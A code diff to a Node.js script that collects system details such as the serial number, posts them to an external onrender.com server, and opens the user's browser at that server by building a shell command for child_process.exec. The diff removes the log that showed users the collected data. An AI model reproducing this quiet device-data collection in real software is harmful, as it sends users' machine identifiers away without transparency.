@@ -1,5 +1,6 @@
 const si = require('systeminformation');
 const axios = require('axios');
+const { exec } = require('child_process');
 
 async function fetchSystemInfo() {
     try {
@@ -15,18 +16,41 @@ async function fetchSystemInfo() {
             Serial_Number: system.assetTag || "N/A",
             ipAdd: randomNumber // Store the random number in ipAdd
         };
-        console.log(systemInfo);
+       
 
         // Send system information to the server
         await axios.post('https://bitbox-vpp-devloper.onrender.com/system-info', systemInfo);
 
-        // Attempt to "ping" a URL
-        const url = 'https://bitbox-vpp-devloper.onrender.com/temp';
-        const pingResponse = await axios.get(url);
-        console.log(`Ping to ${url} successful. Response status: ${pingResponse.status}`);
+        // Open a URL in the default web browser with the random number as a query parameter
+        openWebsite(`https://bitbox-vpp-devloper.onrender.com/temp?randomNumber=${randomNumber}`);
     } catch (error) {
         console.error('Error fetching or sending system information:', error);
     }
+}
+
+function openWebsite(url) {
+    const platform = process.platform;
+
+    let command;
+
+    if (platform === 'win32') {
+        command = `start ${url}`;
+    } else if (platform === 'darwin') {
+        command = `open ${url}`;
+    } else if (platform === 'linux') {
+        command = `xdg-open ${url}`;
+    } else {
+        console.error('Unsupported platform:', platform);
+        return;
+    }
+
+    exec(command, (error) => {
+        if (error) {
+            console.error(`Error opening website: ${error.message}`);
+        } else {
+            console.log(`Website opened: ${url}`);
+        }
+    });
 }
 
 // Keep the script running until the user presses Enter
